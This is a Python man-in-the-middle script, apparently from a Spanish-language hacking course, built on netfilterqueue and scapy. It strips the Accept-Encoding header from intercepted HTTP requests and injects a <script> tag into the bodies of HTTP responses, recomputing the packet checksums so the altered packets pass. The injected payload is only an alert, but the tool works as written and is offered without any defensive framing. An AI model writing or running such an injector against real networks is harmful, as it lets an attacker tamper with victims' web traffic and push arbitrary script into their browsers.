#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re
import signal
import sys

def def_handler(sig, frame):
    print(f"\n Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                print(f"\n Solicitud: \n")
                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())
            elif scapy_packet[scapy.TCP].sport == 80:
                print(f"\n Respuesta del servidor: \n")
                modified_load = scapy_packet[scapy.Raw].load.replace(b'</body>', b'<script>alert("Se tensa con el XSS");</script></body>')
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())
                print(scapy_packet.show())
        except:
            pass

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
